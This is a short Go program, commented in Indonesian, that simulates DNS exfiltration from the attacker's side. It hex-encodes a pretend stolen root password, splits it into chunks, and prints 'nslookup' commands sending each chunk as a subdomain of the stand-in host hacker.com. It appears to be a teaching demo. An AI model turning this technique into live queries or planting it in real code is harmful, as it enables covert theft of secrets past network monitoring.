package main

import (
	"encoding/hex"
	"fmt"
)

func main() {
	secretData := "INI_ADALAH_PASSWORD_ROOT_SERVER_KAMPUS_YANG_DICURI"

	fmt.Println("=== SIMULASI EKSFILTRASI DATA (SIDE ATTACKER) ===")
	fmt.Printf("Data Asli     : %s\n", secretData)

	encodedData := hex.EncodeToString([]byte(secretData))
	fmt.Printf("Encoded (Hex) : %s\n", encodedData)

	fmt.Println("\n--- Mengirim Paket DNS Jahat ---")

	chunkSize := 30
	var chunks []string

	for i := 0; i < len(encodedData); i += chunkSize {
		end := i + chunkSize
		if end > len(encodedData) {
			end = len(encodedData)
		}
		chunk := encodedData[i:end]
		chunks = append(chunks, chunk)
	}

	for i, chunk := range chunks {
		maliciousDomain := fmt.Sprintf("%s.hacker.com", chunk)

		fmt.Printf("Paket ke-%d dikirim: nslookup %s\n", i+1, maliciousDomain)
	}
}
